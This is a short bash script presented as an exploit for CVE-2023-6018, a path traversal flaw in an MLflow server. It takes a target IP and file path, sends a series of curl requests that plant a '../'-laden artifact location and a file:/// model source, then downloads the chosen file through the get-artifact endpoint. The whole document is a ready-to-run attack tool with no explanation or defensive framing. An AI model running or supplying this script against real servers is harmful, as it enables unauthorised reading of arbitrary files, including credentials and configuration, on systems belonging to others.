#!/bin/bash

# ======================================
#   CVE-2023-6018 Path Traversal Exploit
# ======================================

if [ $# -ne 2 ]; then
    echo "Usage: $0 <IP_ADDRESS> <FILE_PATH>"
    exit 1
fi

IP_ADDRESS="$1"
FILE_PATH="$2"

DIR_PATH=$(dirname "$FILE_PATH")
FILE_NAME=$(basename "$FILE_PATH")
RANDOM_NAME=$RANDOM

EXPERIMENT_ID=$(curl -s -X POST -H 'Content-Type: application/json' \
    -d "{\"name\": \"$RANDOM_NAME\", \"artifact_location\": \"http:///#/../../../../../../../../../../../../../../$DIR_PATH/\"}" \
    "http://$IP_ADDRESS:5000/ajax-api/2.0/mlflow/experiments/create" | jq -r '.experiment_id')

RUN_ID=$(curl -s -X POST -H 'Content-Type: application/json' \
    -d "{\"experiment_id\": \"$EXPERIMENT_ID\"}" \
    "http://$IP_ADDRESS:5000/api/2.0/mlflow/runs/create" | jq -r '.run.info.run_id')

curl -s -X POST -H 'Content-Type: application/json' \
    -d "{\"name\": \"$RANDOM_NAME\"}" \
    "http://$IP_ADDRESS:5000/ajax-api/2.0/mlflow/registered-models/create" >/dev/null

curl -s -X POST -H 'Content-Type: application/json' \
    -d "{\"name\": \"$RANDOM_NAME\", \"run_id\": \"$RUN_ID\", \"source\": \"file:///$DIR_PATH/\"}" \
    "http://$IP_ADDRESS:5000/ajax-api/2.0/mlflow/model-versions/create" >/dev/null

curl -s "http://$IP_ADDRESS:5000/model-versions/get-artifact?path=$FILE_NAME&name=$RANDOM_NAME&version=1"


